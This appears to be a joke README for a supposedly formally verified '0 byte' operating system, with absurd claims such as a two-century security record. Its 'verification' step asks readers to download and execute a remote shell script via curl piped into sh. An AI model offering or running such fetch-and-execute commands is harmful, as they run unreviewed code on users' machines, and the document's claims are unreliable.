# Very Secure and Stable, Minimal(0 byte) Operating System
This system is a highly secure and stable piece of software, formally verified by the Isabelle/HOL mathematical proof engine—the same tool used to verify the seL4 microkernel. By achieving mathematical proof of correctness, it provides the highest level of security assurance available in computer science. Unlike traditional hardened operating systems such as GrapheneOS, which rely on mitigation strategies, this verified system mathematically guarantees the absence of entire classes of software bugs at its core.

### Overwiew
This system is a general-purpose operating system that is completely minimal (0 bytes) and more secure than systems such as GrapheneOS. It has a zero CVE history, is mathematically proven, and can run on all binary systems. This is a record that has stood unbroken for the last two centuries.

### Formal Verification
Yes, this is excellent software, but how can I be sure it’s verified? To help with this, we’ve written a brilliant script—tailored specifically for you—that works on all Unix environments, is POSIX-compatible, and doesn’t include any cumbersome GNU extensions. You can switch to your own /home directory and run it using this command (Note: md5sum, curl, the POSIX shell and git are required for this software to work):
```
sh -c "$(curl -sS https://raw.githubusercontent.com/faydini065/verysecureos/refs/heads/main/test.sh)"
```
### License
This software is under the No LoopHole License v1(NHLv1) license. The licence text can be found at   [LICENSE](https://github.com/faydini065/verysecureos/blob/main/LICENSE) in this Git repository
